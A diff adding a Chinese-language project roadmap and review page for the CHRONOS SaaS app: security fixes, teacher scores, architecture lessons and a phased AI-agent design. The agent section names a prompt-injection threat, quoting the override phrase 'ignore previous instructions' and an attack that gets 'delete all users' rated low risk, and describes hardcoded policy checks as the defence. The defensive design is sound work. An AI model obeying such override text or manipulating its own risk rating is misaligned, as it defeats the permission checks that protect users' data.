+<div class="fix-card p2-card">
+<div class="fix-num">21</div>
+<div class="fix-body">localStorage token → httpOnly cookie (sameSite=lax) 防 XSS 窃取</div>
+</div>
+
+<!-- ═══ 反思 ═══ -->
+<h3>🔍 复盘：为什么会有这些问题？</h3>
+
+<div style="background:var(--card); border-radius:10px; padding:20px 24px; margin-bottom:20px;">
+
+<div style="margin-bottom:12px;">
+<strong style="color:var(--danger)">教训 1 · Schema 迁移不同步导致全站瘫痪</strong><br>
+<span style="color:var(--muted);font-size:13px;">
+tokenVersion 列在代码中引用但服务器 DB 没有——因为部署前没跑 drizzle-kit push。
+老 DB 缺列 → SQL 报错 → 全站 500。紧急回退 tokenVersion 后恢复正常，但忘了加回来。
+<br><strong>规则：</strong>部署前必须 <code>drizzle-kit push</code>，schema 变更前先备份 DB。
+</span>
+</div>
+
+<div style="margin-bottom:12px;">
+<strong style="color:var(--danger)">教训 2 · 快速迭代欠安全审查</strong><br>
+<span style="color:var(--muted);font-size:13px;">
+forgotPassword 直接返回 token 是"开发测试方便"的产物，忘了切换到生产模式。
+文件预览页直接拼接文件名是为了"快速出效果"，没考虑 XSS。
+<br><strong>规则：</strong>任何用户输入进入 HTML 前必须编码或消毒。敏感令牌不可返回给客户端。
+</span>
+</div>
+
+<div style="margin-bottom:12px;">
+<strong style="color:var(--wip)">教训 3 · 性能设计缺乏"规模意识"</strong><br>
+<span style="color:var(--muted);font-size:13px;">
+Dashboard 和所有列表查询都是 .all() + JS filter——在 10 条数据时完全 OK，
+但代码里没有任何 LIMIT 或 WHERE 下推。这是典型的"先跑通再优化"被遗忘的陷阱。
+<br><strong>规则：</strong>所有列表类查询必须有 LIMIT 上限。聚合尽量在 SQL 做，不在 JS 做。
+</span>
+</div>
+
+<div style="margin-bottom:12px;">
+<strong style="color:var(--wip)">教训 4 · 空 catch 是定时炸弹</strong><br>
+<span style="color:var(--muted);font-size:13px;">
+6 处 catch {} 完全静默——审计日志写入失败？不知道。Webhook 失败？不知道。
+用户查询失败？返回 null 不报错。生产环境出问题完全无法排查。
+<br><strong>规则：</strong>catch 块至少 logger.warn(error)，关键路径 logger.error + Sentry。
+</span>
+</div>
+
+<div>
+<strong style="color:var(--muted)">教训 5 · God File 是质量的腐蚀剂</strong><br>
+<span style="color:var(--muted);font-size:13px;">
+routers.ts 1042 行 + _core/index.ts 502 行——不是一个人的问题，是缺乏模块拆分纪律。
+每次加功能都"先放这儿"，日积月累就成了不可维护的巨石。
+<br><strong>规则：</strong>单个文件超过 300 行必须考虑拆分。路由按实体分文件。中间件按职责分文件。
+</span>
+</div>
+
+</div>
+
+<!-- ═══ 执行路线 ═══ -->
+<h3>📋 执行路线</h3>
+
+<table style="margin-bottom:20px;">
+  <tr><th>优先级</th><th>工作量</th><th>内容</th><th>得分提升</th></tr>
+  <tr><td class="p0">P0</td><td>1–2 天</td><td>XSS · tokenVersion · 密码令牌 · 全表扫描</td><td>+8 → 67 分</td></tr>
+  <tr><td class="p1">P1</td><td>1–2 周</td><td>空catch · GodFile拆分 · cache重构 · any清理 · FTS5 · 测试补全 · 前端测试 · 权限浮空</td><td>+5 → 72 分</td></tr>
+  <tr><td class="p2">P2</td><td>有空就做</td><td>文档 · 清理 · 注释 · 统一配置 · 优雅关闭 · httpOnly cookie</td><td>+3 → 75 分</td></tr>
+</table>
+
+<p style="color:var(--muted);font-size:12px;margin-top:-12px;">
+<strong>目标：</strong>两周内从 59.2 → 72 分，进入「可小团队自托管的 SaaS 雏形」区间。然后开启 Phase 7 设计语言。
+</p>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- 教师评估 + Phase 7+8 路线                                        -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2>教师评估 &amp; 高阶路线图</h2>
+
+<div class="summary-bar">
+  <span><strong>教师评分：8.0 / 10</strong></span>
+  <span class="badge-y">从项目 → 产品</span>
+</div>
+
+<p style="color:var(--muted);font-size:13px;margin-bottom:16px;">
+教师核心评价："架构方向正确、工程意识明显提升、技术选型合理——已经超过大多数个人项目。
+但距离一流水平（Linear/Notion 级别）仍有差距：产品定位不够锋利、商业级能力不足、AI 还不是核心能力。"
+</p>
+
+<h3>我们已有 vs 教师误判</h3>
+
+<table style="margin-bottom:16px;">
+  <tr><th>教师认为缺失</th><th>实际情况</th></tr>
+  <tr><td>无 Auth</td><td class="done">✅ JWT + bcrypt · register/login/forgotPassword/resetPassword · 软删除</td></tr>
+  <tr><td>无 Workspace</td><td class="done">✅ 多 workspace 完全隔离 · projectMembers 两层守卫 · 变异测试验证</td></tr>
+  <tr><td>无 Permission</td><td class="done">✅ admin/user 角色 · protectedProcedure/adminProcedure · requireProjectAccess</td></tr>
+  <tr><td>无 Audit Log</td><td class="done">✅ audit_logs 表 · 财务操作/登录全量记录</td></tr>
+</table>
+
+<p style="color:var(--muted);font-size:11px;margin-top:-12px;">
+⚠️ README 第48行写着"当前为本地/单人模式(no-auth)"——这是 v2.2 的文档，v2.8 已过时。已修正。
+</p>
+
+<h3>教师建议路线图</h3>
+
+<div class="phase">
+<div class="phase-meta"><span class="done">现状</span><span>8.0/10</span></div>
+<div class="deliverable"><span class="check">✅</span> 架构分层清晰 · 模块边界规则 · CI/CD · Docker · 测试体系</div>
+<div class="deliverable"><span class="check">✅</span> Auth 体系 · Workspace 隔离 · 角色权限 · 审计日志</div>
+<div class="deliverable"><span class="half">🟡</span> 产品定位不够锋利 — 目前像"企业内管平台"，缺一句话定位</div>
+<div class="deliverable"><span class="half">🟡</span> AI 停留在功能层 — AIChatBox 是"AI功能"不是"AI产品"</div>
+<div class="deliverable"><span class="half">🟡</span> 业务层未分层 — router 直接操作 DB，缺 service/repository 层</div>
+</div>
+
+<h3>Phase 7 · RBAC + 领域模型 ✅ 100%</h3>
+<div class="phase done">
+<div class="phase-meta"><span class="done">2026-07-14</span></div>
+<div class="deliverable"><span class="check">✅</span> RBAC 完整实现 — permissions+role_permissions表 · hasPermission · permissionProcedure · 通配符</div>
+<div class="deliverable"><span class="check">✅</span> costs.create 接入 permissionProcedure("finance.edit") · 首个 RBAC 路由</div>
+<div class="deliverable"><span class="check">✅</span> 业务层分层 — 6×Service · routers.ts 949→790行 (-160)</div>
+<div class="deliverable"><span class="check">✅</span> P0×5 + P1空catch + Activity + Email(7×Service共计)</div>
+<div class="deliverable"><span class="check">✅</span> Domain 测试 — 5条 (任务生命周期+权限隔离)</div>
+<div class="deliverable"><span class="check">✅</span> tsc 0 · 144/144 tests · 冒烟测试通过</div>
+</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<!-- 老师 2026-07-14 审查 · 与内部计划独立标注    -->
+<!-- ═══════════════════════════════════════════ -->
+<h3 style="border-left:3px solid #f59e0b;padding-left:10px;">📋 老师审查反馈（2026-07-14 · 7.5/10）</h3>
+<div class="phase" style="border-color:#f59e0b;">
+<div class="phase-meta"><span style="color:#f59e0b;">外部审查 · 非内部评分</span></div>
+
+<div class="deliverable">
+<strong>老师原话</strong><br>
+<em>"架构判断力已经明显超出能写出能跑的代码这个阶段。但交付前有没有把最基本的事情验证一遍，这个纪律问题还在反复咬你——compression 是 helmet/express-rate-limit 之后的第三次同类失败。"</em>
+</div>
+
+<div class="deliverable" style="margin-top:8px;">
+<strong>🔴 P0 · 交付问题</strong><br>
+· compression 依赖缺失 — package.json 有 @types 无本体，服务崩溃 <span style="color:#22c55e;">[已修]</span><br>
+· forgotPassword 功能残废 — resetToken 未通过 EmailService 发给用户 <span style="color:#22c55e;">[已修]</span><br>
+· 交付检查漏冒烟测试 — npm run check 不验证服务能否启动
+</div>
+
+<div class="deliverable" style="margin-top:8px;">
+<strong>🟡 P1 · 代码问题</strong><br>
+· shared/pagination.ts 未接入任何路由 — 分页工具造好但没装上<br>
+· Agent Executor 缺中途失败处理 — 创建项目成功+创建任务失败→半成品数据
+</div>
+
+<div class="deliverable" style="margin-top:8px;">
+<strong>✅ 老师认可</strong><br>
+· P0-1 (XSS): 真的修了，esc() 转义正确<br>
+· P0-2 (tokenVersion): 真的修了，dbUser.tokenVersion !== payload.tv 比对正确<br>
+· P0-3 (密码泄露): 修得超出预期 — 查无此人返回 sent:true，不暴露用户是否存在<br>
+· P0-4 (全表扫描): dashboard.ts 已修复，先框定用户 projectIds 再查<br>
+· RBAC: permissions+role_permissions 表是真的，permissionProcedure 调用找得到<br>
+· Service 层: 7 个真实文件，不是空文档<br>
+· AI Agent 架构: risk_level 硬编码、Planner/Executor 解耦、Non-goals — 安全意识正确
+</div>
+
+<div class="deliverable" style="margin-top:8px;">
+<strong>老师建议的下一步（按优先级）</strong><br>
+1. 冒烟测试入 CI（启动服务→curl 首页→关掉）<br>
+2. shared/pagination 接入至少一个列表路由<br>
+3. Agent Executor 补中途失败处理<br>
+4. 继续 Service 层重构，routers.ts 剩余业务逻辑搬走
+</div>
+</div>
+
+<h3>Phase 8 · AI Agent Foundation ⏳</h3>
+<div class="phase">
+<div class="phase-meta"><span>待审查</span><span>预估 12-18 天</span></div>
+
+<div class="deliverable">
+<strong>架构原则（多轮审查沉淀）</strong><br>
+<em style="color:#22c55e;">① AI 永远只产生"建议（Plan）"，只有 Executor 才能产生"事实（State Change）"</em><br>
+<em style="color:#22c55e;">② AI 不绕过权限体系 — 它是用户的操作代理</em><br>
+<strong>③ Planner / Executor 彻底解耦</strong> — Planner 不访问 DB；Executor 不调用 LLM<br>
+<strong>④ PolicyEngine 只基于 Command 决策</strong> — 不读 Prompt（安全边界）
+</div>
+
+<div class="deliverable" style="margin-top:8px;">
+<strong>MVP 目标</strong><br>
+用户输入 → AgentService 生成 Plan → 用户确认 → Executor 创建项目和任务 → 全程审计。<br>
+<strong>只做一个意图：CREATE_PROJECT。</strong>
+</div>
+
+<div class="deliverable" style="margin-top:8px;">
+<strong>❌ Non-goals（防 Scope 爆炸）</strong><br>
+多 Agent · Auto Approval · Memory · Tool Calling · Intent Router · 自动修改项目 · 自动审批预算 · AI 自主定时任务
+</div>
+
+<div class="deliverable" style="margin-top:12px;">
+<strong>⚠️ 开工前必修（3 轮审查沉淀）</strong><br>
+<span style="color:#fca5a5;">① risk_level 不由 AI 输出——</span>PolicyEngine 硬编码。AI 输出中的 risk 字段忽略，防止 "删除所有用户判为 LOW"<br>
+<span style="color:#fca5a5;">② required_permissions 不由 AI 输出——</span>PolicyEngine 根据 action 硬编码查表。移除 AI 输出中此字段，省 token 且避免矛盾<br>
+<span style="color:#fcd34d;">③ 状态机 8→5：</span>planning → pending → executing → completed / failed / cancelled（对单意图 MVP 够用）<br>
+<span style="color:#fcd34d;">④ 只保留 ai_runs 表——</span>ai_jobs 等 Phase 9 真正需要异步执行时再加，避免双表冲突<br>
+<span style="color:#fcd34d;">⑤ 不建 commands/</span> · 复用 db 层 · tx 参数<br>
+<span style="color:#94a3b8;">⑥ Executor 幂等</span> · idempotency_key · 安全 Retry<br>
+<span style="color:#94a3b8;">⑦ Planner 不访问 DB · Executor 不调用 LLM</span> · 彻底解耦<br>
+<span style="color:#94a3b8;">⑧ Prompt / Schema / Command 三版本化</span> · 协议兼容<br>
+<span style="color:#94a3b8;">⑨ Timeout 15s · Retry 仅网络错误/429/503</span> · 不重试 bad output<br>
+<span style="color:#94a3b8;">⑩ PolicyEngine 只读 Command</span> · 不读 Prompt（Prompt Injection 防线）<br>
+💰 成本 ¥0.09-0.25/次 · 上限 ¥0.30
+<span style="color:#94a3b8;">🔒 并发：每用户最多 1 个 pending 的 ai_run（后端唯一约束）</span><br>
+<span style="color:#94a3b8;">🔒 Prompt injection：risk 不从 AI 输出读取 → 攻击者 "忽略之前指令" 无效（已由 #1 解决）</span><br>
+<span style="color:#94a3b8;">🔧 DB 事务：db/*.ts 函数增可选 tx 参数，或 executor.ts 直接用 Drizzle 查询</span><br>
+<span style="color:#94a3b8;">💰 成本修正：¥0.09-0.25/次（GPT-4o/Kimi），预算上限 ¥0.30/次，超过拒绝</span>
+</div>
+
+<!-- ===== Step 0 ===== -->
+<div class="deliverable" style="margin-top:12px;">
+<strong>Step 0 · 骨架</strong><span class="verify">3 天</span><br>
+· <code>server/services/ai/</code> · 4 文件：types.ts · AgentService.ts · PolicyEngine.ts · index.ts<br>
+· types.ts：
+<pre style="font-size:11px;margin:4px 0;color:#94a3b8;">
+  type PolicyDecision = "ALLOW" | "DENY" | "REQUIRE_APPROVAL"
+  type AICommand = { action; params; command_version }
+  // risk_level 不由 AI 输出 → PolicyEngine 硬编码
+</pre>
+</div>
+
+<!-- ===== Step 1 ===== -->
+<div class="deliverable" style="margin-top:8px;">
+<strong>Step 1 · Planner</strong><span class="verify">5-7 天</span><br>
+· <code>POST /api/trpc/ai.plan</code> — 调现有 llm.ts · schema_version 固定 · 最多 2 次重试<strong>（仅网络/429/503）</strong><br>
+· Timeout 15s → 返回 <em>"AI 处理中，请稍后重试"</em><br>
+· Planner <strong>不访问数据库</strong> · 输出：<code>{intent, commands[{action,params,command_version}], reasoning_summary}</code><br>
+· LLMProvider 抽象：AgentService → LLMProvider → OpenAI/DeepSeek/Kimi（换模型不碰业务）<br>
+· Prompt 文件版本化：<code>prompts/planner_v1.md</code>（Git diff）<br>
+· 成本 ¥0.09-0.25/次 · 上限 ¥0.30
+</div>
+
+<!-- ===== Step 2 ===== -->
+<div class="deliverable" style="margin-top:8px;">
+<strong>Step 2 · Approval + 状态机</strong><span class="verify">3-5 天</span><br>
+· 新表 <code>ai_runs</code> · 5 状态：planning → pending → executing → completed / failed / cancelled<br>
+· <strong>幂等</strong>：<code>idempotency_key</code> 字段 · 执行前查是否已执行 · 安全 Retry<br>
+· 并发：每用户最多 1 个 pending（DB 唯一约束）<br>
+· 前端：[确认执行] [修改] [取消]
+</div>
+
+<!-- ===== Step 3 ===== -->
+<div class="deliverable" style="margin-top:8px;">
+<strong>Step 3 · Executor</strong><span class="verify">5-7 天</span><br>
+· <strong>Executor 不调用 LLM</strong> · 复用 db/*.ts · executor.ts 只做编排<br>
+· 执行链：Command → PolicyEngine（只读 Command，不读 Prompt）→ Permission → db.createProject() → db.createTask()<br>
+· Transaction：db 函数加可选 tx 参数<br>
+· 所有 AI 数据标记 <code>createdVia: "AI"</code>
+</div>
+
+<!-- ===== Step 4 ===== -->
+<div class="deliverable" style="margin-top:8px;">
+<strong>Step 4 · Audit + Cost</strong><span class="verify">3-5 天</span><br>
+· 新表 <code>ai_execution_logs</code>：prompt_version · schema_version · model · input/output_tokens · cost · status · error · duration_ms<br>
+· 关联：<code>ai_runs.id</code> → 全链路可追溯
+</div>
+
+<!-- ===== Phase 9 ===== -->
+<div class="deliverable" style="margin-top:12px;">
+<strong>Phase 9 · Non-goals for now</strong><br>
+Intent Router · Tool Calling · Memory · AI Operations · ai_jobs 异步队列 · Auto Approval · 多 Agent · Stream 响应
+</div>
+
+<!-- ===== 审查记录 ===== -->
+<div class="deliverable" style="margin-top:8px;">
+<strong>审查记录（多轮迭代）</strong><br>
+· 同学代码审查：发现 5 个代码级问题（已修正）<br>
+· 教师架构审查：指出 PolicyEngine 两层权限、状态机、Non-goals（已吸收）
+</div>
+</div>
+
+<h3>Phase 9 · 生产级基础设施 ⏳</h3>
+<div class="phase">
+<div class="phase-meta"><span>教师优先级 #3</span><span>3-6 周</span></div>
+<div class="deliverable"><span class="todo">⏳</span> PostgreSQL 迁移 — 并发 · 索引优化 · JSON 能力 · 事务</div>
+<div class="deliverable"><span class="todo">⏳</span> Redis 缓存 · 消息队列 · 后台 Job</div>
+<div class="deliverable"><span class="todo">⏳</span> 测试升级 — Unit + Integration + E2E (Playwright) · ≥60% coverage</div>
+<div class="deliverable"><span class="todo">⏳</span> httpOnly cookie · CSP 严格模式 · 前端测试框架</div>
+<div class="deliverable"><span class="todo">⏳</span> P1/P2 收尾 — God File 拆分 · cache 重构 · any 清理</div>
+</div>
+
+<h3>教师原话</h3>
+
+<blockquote style="background:var(--card);border-left:3px solid var(--accent);padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:1.8;">
+"如果目标只是一流作品集——现在已经够了。<br>
+如果目标是一流水平 SaaS 产品——<br>
+下一步不要优化UI，也不要加功能。<br>
+应该进入<strong style='color:#c7d2fe'>'从项目→产品'</strong>的阶段。<br>
+核心路线：Auth + Workspace + Permission + Domain Model + AI Agent + Production Infrastructure。<br>
+这几个完成后，项目等级会发生一次明显跃迁。"
+</blockquote>
+
+<p style="color:var(--muted);font-size:12px;margin-top:20px;text-align:center;">
+<em>路线图 v8 · 教师评估并入 · README已修正 · P0修复即开始</em>
+</p>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- 第二轮教师反馈 · 工程指标 → 业务指标 · 架构审计                     -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2>第二轮反馈 · 从工程指标到业务指标</h2>
+
+<div class="summary-bar">
+  <span><strong>关键洞察</strong></span>
+  <span class="badge-y">路线图比项目本身提升更大</span>
+</div>
+
+<blockquote style="background:var(--card);border-left:3px solid var(--accent);padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:1.8;">
+"这份路线图体现的是工程思维——init-db合并、any作为技术债管理、变异测试验证权限、文档状态必须可验证——这些已经不是'会React的人'会去想的了。<br><br>
+<strong style='color:#fca5a5'>但我有一个尖锐的提醒：</strong><br>
+路线图 95% 是工程指标（143 tests · tsc 0 · CI SUCCESS），但真正的一流产品还有另一套指标——<strong style='color:#c7d2fe'>业务复杂度、平均函数长度、模块耦合、循环依赖、测试价值、维护成本</strong>。<br><br>
+警惕'指标工程'——为了 100% coverage 写无意义测试、为了 ESLint 改代码而不是为了业务改代码。<br><br>
+建议下一步：按模块做架构审计（Architecture Audit），而不是继续讨论技术选型。'这里为什么这样设计？有没有更好的架构？'比'这个项目值几分？'更重要。"
+</blockquote>
+
+<!-- ═══ 业务指标对照 ═══ -->
+<h3>路线图自我审计：工程指标 vs 业务指标</h3>
+
+<table style="margin-bottom:16px;">
+  <tr><th>现在写的（工程指标）</th><th>缺的（业务指标）</th></tr>
+  <tr><td>143 tests</td><td>Task 生命周期有测试吗？权限继承有测试吗？成本计算有测试吗？</td></tr>
+  <tr><td>tsc 0</td><td>平均函数长度？最大函数多少行？</td></tr>
+  <tr><td>CI SUCCESS</td><td>模块耦合度？循环依赖？公共 API 数量？</td></tr>
+  <tr><td>any 阈值 253→150</td><td>业务规则重复率？router 里塞了多少业务逻辑？</td></tr>
+  <tr><td>Phase X done</td><td>每 Phase 回答四个问题：为什么这样设计？有没有更简单方案？10x数据还能撑住吗？有没有新增耦合？</td></tr>
+</table>
+
+<!-- ═══ 架构审计计划 ═══ -->
+<h3>架构审计计划 · 按模块逐轮 Code Review</h3>
+
+<table style="margin-bottom:16px;">
+  <tr><th>轮次</th><th>模块</th><th>审计重点</th><th>状态</th></tr>
+  <tr><td>R1</td><td><code>server/</code></td><td>Router → Service → Repository 分层 · 重复逻辑 · 耦合 · 命名 · 未来技术债</td><td>⏳</td></tr>
+  <tr><td>R2</td><td><code>client/</code></td><td>组件职责 · Hook 职责 · 700行组件？ · 900行Hook？</td><td>⏳</td></tr>
+  <tr><td>R3</td><td><code>shared/</code></td><td>真正的共享 or 垃圾桶？</td><td>⏳</td></tr>
+  <tr><td>R4</td><td>数据库 Schema</td><td>扩展性 · 索引 · 命名 · 以后还能加字段吗？</td><td>⏳</td></tr>
+  <tr><td>R5</td><td>Domain Model</td><td>Task 是真正的 Domain 还是"页面"？</td><td>⏳</td></tr>
+  <tr><td>R6</td><td>权限体系</td><td>真正的隔离？workspace 变异测试通过 ≠ RBAC 完整</td><td>⏳</td></tr>
+</table>
+
+<!-- ═══ 模块健康度 ═══ -->
+<h3>模块健康度（自评 · 待审计验证）</h3>
+
+<table style="margin-bottom:16px;">
+  <tr><th>模块</th><th>自评</th><th>问题</th><th>建议</th></tr>
+  <tr><td>Task</td><td class="done">8</td><td>router 承担了些逻辑</td><td>拆分 TaskService</td></tr>
+  <tr><td>Auth</td><td class="done">7</td><td>tokenVersion 回退 · forgotPassword 泄露 · context 未验证</td><td>P0 已列计划</td></tr>
+  <tr><td>Calendar</td><td class="done">7</td><td>仅支持里程碑，无普通事件</td><td>待扩展</td></tr>
+  <tr><td>Project</td><td class="wip">6</td><td>router 承担太多逻辑 · 无独立 service</td><td>需要重构</td></tr>
+  <tr><td>AI (AIChatBox)</td><td class="partial">5</td><td>"AI 功能"不是"AI 产品" · 属对话框而非工作流核心</td><td>Phase 8 重建</td></tr>
+  <tr><td>Notification</td><td class="wip">6</td><td>空 catch · 循环依赖风险</td><td>待审计</td></tr>
+  <tr><td>Cost/Revenue</td><td class="done">7</td><td>复制粘贴代码 · 无抽象</td><td>拆分 routers</td></tr>
+</table>
+
+<!-- ═══ 新增规则 ═══ -->
+<h3>路线图 v8 → v9 规则变更</h3>
+
+<div style="background:var(--card); border-radius:10px; padding:20px 24px; margin-bottom:20px; font-size:13px; color:var(--muted); line-height:1.8;">
+
+<strong style="color:#c7d2fe;">1. 每个 Phase 结尾加 Architecture Review 四问</strong><br>
+· 为什么这样设计？· 有没有更简单方案？· 10x 数据还能撑住吗？· 有没有新增耦合？<br><br>
+
+<strong style="color:#c7d2fe;">2. 路线图指标从纯工程 → 工程+业务双轨</strong><br>
+· 工程：tsc · tests · CI · coverage · ESLint<br>
+· 业务：模块耦合 · 最大函数行数 · 领域逻辑测试覆盖 · 重复率 · 维护成本<br><br>
+
+<strong style="color:#c7d2fe;">3. 避免"指标工程"</strong><br>
+· 不为 100% coverage 写无意义测试 · 不为 ESLint 改业务代码<br>
+· Review Checklist 精简——只保留真正阻止过问题的条目<br><br>
+
+<strong style="color:#c7d2fe;">4. 引入 ADR (Architecture Decision Record)</strong><br>
+· 每个重大架构决策记录为什么 · 半年后自己不会忘<br>
+
+</div>
+
+<!-- ═══════════ 第三轮代码级审核 ═══════════ -->
+<h2>第三轮反馈 · 源码级架构审核</h2>
+
+<div class="summary-bar">
+  <span><strong>基于实际代码</strong></span>
+  <span class="badge-y">6 项关键差距</span>
+  <span>方向正确，不需推倒重构</span>
+</div>
+
+<blockquote style="background:var(--card);border-left:3px solid var(--accent);padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:1.8;">
+"CHRONOS 已经具备现代全栈应用的工程基础，代码组织、技术选型和开发规范明显高于普通个人项目。目前主要限制因素不是技术实现能力，而是从'功能型应用'向'商业化 SaaS 产品'的过渡能力。"<br><br>
+— 教师，以技术负责人角色 Code Review
+</blockquote>
+
+<h3>关键差距（按代码审核优先级）</h3>
+
+<div class="fix-card p0-card">
+<div class="fix-num">1</div>
+<div class="fix-body">
+<strong>后端业务层还不够成熟</strong> <span style="color:var(--muted);font-size:11px;">— 最大代码问题</span>
+<div class="fix-evidence">
+当前结构：<code>router → db → database</code>。tasks.create() 里 validate + insert + notify 全塞 router。
+</div>
+<div class="fix-action">
+<strong>目标：</strong><code>router → service → repository → database</code><br>
+引入 <code>server/services/TaskService.ts</code> · <code>ProjectService.ts</code> · <code>WorkspaceService.ts</code>。
+权限检查、AI 分析、通知、审计日志、Webhook、自动化规则各归各位，router 只做路由。<br>
+<em>策略：不推倒重构。逐步引入 service 层，新功能走新路径，老代码自然淘汰。</em>
+</div>
+</div>
+</div>
+
+<div class="fix-card p0-card">
+<div class="fix-num">2</div>
+<div class="fix-body">
+<strong>权限体系还不够企业级</strong> <span style="color:var(--muted);font-size:11px;">— 最大 SaaS 差距</span>
+<div class="fix-evidence">
+当前：admin / member 角色。workspace + projectMembers 两层。
+不足：无法表达 <code>project.task.create</code> · <code>finance.view</code> · <code>vendor.manage</code> 细粒度权限。
+</div>
+<div class="fix-action">
+<strong>目标：</strong>RBAC — Organization → User → Membership → Role → Permission → Resource。
+权限表达为 <code>resource.action</code>，例如 <code>task.read</code> · <code>finance.edit</code>。
+默认角色模板（管理员/财务/成员/观察者）+ 可自定义。
+</div>
+</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">3</div>
+<div class="fix-body">
+<strong>数据库设计还需提升</strong>
+<div class="fix-action">
+① <strong>统一 activity_logs：</strong>所有关键操作进 activity_logs，"张三 10:32 创建任务 X"。<br>
+② <strong>软删除：</strong>所有核心表加 <code>deletedAt</code>，不做物理删除。<br>
+③ <strong>多租户加强：</strong>确认所有核心表都有 <code>workspaceId</code> 且查询永远带 workspace scope。
+</div>
+</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">4</div>
+<div class="fix-body">
+<strong>测试还不是生产保障</strong>
+<div class="fix-action">
+① <strong>Domain Test：</strong>任务状态流转 Todo→Doing→Done 是否允许非法跳转？<br>
+② <strong>Permission Test：</strong>普通成员不能删除项目、不能看他人任务。<br>
+③ <strong>Workflow Test：</strong>创建 workspace → 邀请成员 → 创建项目 → 完成任务（端到端）。<br>
+④ <strong>Playwright E2E：</strong>至少覆盖 5 条核心用户路径。
+</div>
+</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">5</div>
+<div class="fix-body">
+<strong>AI 路线需要调整方向</strong>
+<div class="fix-action">
+当前：AI 是"附加功能"（AIChatBox 对话框）。<br>
+<strong>目标：AI 成为核心工作流——不是 Chatbot，是 AI Operator。</strong><br>
+用户输入"准备一次产品发布" → AI 自动生成 Project + Milestones + Tasks + Timeline + Risk + Budget → 持续跟踪、提醒、调整。
+</div>
+</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">6</div>
+<div class="fix-body">
+<strong>产品方向偏宽，不够锋利</strong>
+<div class="fix-action">
+CHRONOS 包含：项目管理 + CRM + 财务 + 供应商 + 文件 + AI + 日历。<br>
+一流产品通常聚焦一个核心价值后再扩展。<br>
+<strong>建议重新定义：</strong>"AI 驱动的小团队项目执行平台"或"AI 项目运营系统"。
+财务、供应商作为增强模块，不是并列功能。
+</div>
+</div>
+</div>
+
+<!-- ═══ 修正优先级 ═══ -->
+<h3>修正后的优先级（教师建议）</h3>
+
+<table style="margin-bottom:16px;">
+  <tr><th>级别</th><th>内容</th><th>目标</th></tr>
+  <tr><td class="p0">P0</td><td>完整 SaaS 基础 — RBAC 细粒度权限 · 多 workspace · 邀请成员 · 数据隔离</td><td>项目→产品分水岭</td></tr>
+  <tr><td class="p0">P0</td><td>后端业务层 — router → service → repository，逐步引入不推倒</td><td>可维护性</td></tr>
+  <tr><td class="p0">P0</td><td>PostgreSQL 迁移 — 并发 · 索引优化 · JSON 能力</td><td>生产就绪</td></tr>
+  <tr><td class="p1">P1</td><td>AI Agent — 不做 Chatbot 做 AI 项目经理</td><td>差异化竞争力</td></tr>
+  <tr><td class="p1">P1</td><td>Activity + Notification 系统 — 邮件 · 站内 · Webhook</td><td>审计 + 留存</td></tr>
+  <tr><td class="p2">P2</td><td>视觉 · 动画 · 主题 · 品牌 · Dark Mode</td><td>产品打磨</td></tr>
+</table>
+
+<!-- ═══ 技术负责人评语 ═══ -->
+<h3>技术负责人 Code Review 结论</h3>
+
+<div style="background:var(--card);border-left:3px solid #22c55e;padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:1.8;">
+<strong style="color:#22c55e;">核心评价：</strong>"CHRONOS 没有明显的大方向错误，不需要推倒重构。"<br><br>
+<strong>优势：</strong>工程基础扎实 · 技术选型合理 · 开发规范明显高于普通项目<br>
+<strong>差距：</strong>领域模型深度 · 企业级权限 · 后端业务架构 · 测试和生产可靠性 · 产品战略聚焦<br>
+<strong>下一阶段重点：</strong>领域模型深化 + 权限体系 + 多租户架构 + 业务服务层 + AI 工作流融合<br>
+<strong>策略：</strong>不增功能，不优化 UI——先做"从功能型应用到商业化 SaaS 产品"的过渡。
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- 第四轮评审 · 面试官视角 · 开发者水平画像                         -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2>第四轮评审 · 面试官视角 &amp; 开发者水平画像</h2>
+
+<div class="summary-bar">
+  <span><strong>解压源码逐文件审</strong></span>
+  <span class="badge-y">综合 7.7/10</span>
+  <span>产品思维强 · 工程化待提升</span>
+</div>
+
+<blockquote style="background:var(--card);border-left:3px solid var(--accent);padding:16px 20px;border-radius:8px;margin:16px 0;color:var(--muted);font-size:13px;line-height:1.8;">
+"功能野心已经接近产品级，但工程约束和架构成熟度还停留在个人开发/小团队阶段。产品思维强，工程化还有提升空间。如果这是一个人完成且不是复制模板——水平不错。"<br><br>
+"如果我是面试官：这个人可以独立负责一个业务模块。产品能力不错，但架构经验还需要证明。"
+</blockquote>
+
+<h3>多维度评分（10 分制）</h3>
+
+<table style="margin-bottom:16px;">
+  <tr><th>维度</th><th>分数</th><th>评价</th></tr>
+  <tr><td>产品设计能力</td><td class="done">8.5</td><td>功能规划明显不是简单 Demo，有 SaaS 产品味道</td></tr>
+  <tr><td>前端工程能力</td><td class="done">8.0</td><td>React + TS + shadcn + 懒加载，完成度不错</td></tr>
+  <tr><td>后端工程能力</td><td class="wip">7.5</td><td>tRPC 架构合理，但业务层有耦合</td></tr>
+  <tr><td>数据建模能力</td><td class="wip">7.5</td><td>基本合理，有 SaaS 思维，缺企业级字段</td></tr>
+  <tr><td>架构设计</td><td class="wip">7.0</td><td>有意识做模块化，但边界不够清晰</td></tr>
+  <tr><td>工程规范</td><td class="done">8.0</td><td>CI · lint · Docker · 文档都有</td></tr>
+  <tr><td>安全意识</td><td class="partial">6.5</td><td>有基础防护，生产级不足</td></tr>
+  <tr><td>可维护性</td><td class="wip">7.0</td><td>router 1000+ 行，中长期维护会出现压力</td></tr>
+  <tr><td>性能意识</td><td class="wip">7.5</td><td>有缓存、懒加载意识，但无分页/索引</td></tr>
